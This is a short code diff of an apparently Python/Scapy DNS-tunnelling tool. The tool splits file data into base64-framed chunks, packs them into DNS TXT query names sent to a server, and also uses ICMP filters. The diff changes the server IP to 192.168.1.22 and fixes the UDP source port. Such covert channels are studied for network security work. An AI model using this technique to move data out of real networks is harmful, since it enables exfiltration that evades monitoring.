@@ -17,7 +17,7 @@ BEGIN_FILE = b'beginf'       # server to open file - name of the file in the dat
 IN_TRANSFER = b'transf'      # server to continue writing to the opened file
 EF = b'eofeof'              # server to close the opened file
 
-SERVER_ADR = "10.1.0.173"
+SERVER_ADR = "192.168.1.22"
 ICMP_RESPONSE = "icmp[0]=0"
 ICMP_REQUEST = "icmp[0]=8"
 
@@ -34,7 +34,7 @@ def send_qery(dest_adr,data,is_output):
         if is_output == 1:                          # if in_transfer flag is required
             content = base64.b64encode(IN_TRANSFER)
             content+=data[x:x+1400]
-            pkt = IP(dst=dest_adr)/UDP()/DNS(qd=DNSQR(qtype="TXT", qname=content))
+            pkt = IP(dst=dest_adr)/UDP(sport="1234")/DNS(qd=DNSQR(qtype="TXT", qname=content))
         else:
             pkt = IP(dst=dest_adr)/UDP()/DNS(qd=DNSQR(qtype="TXT", qname=data))
         send(pkt)
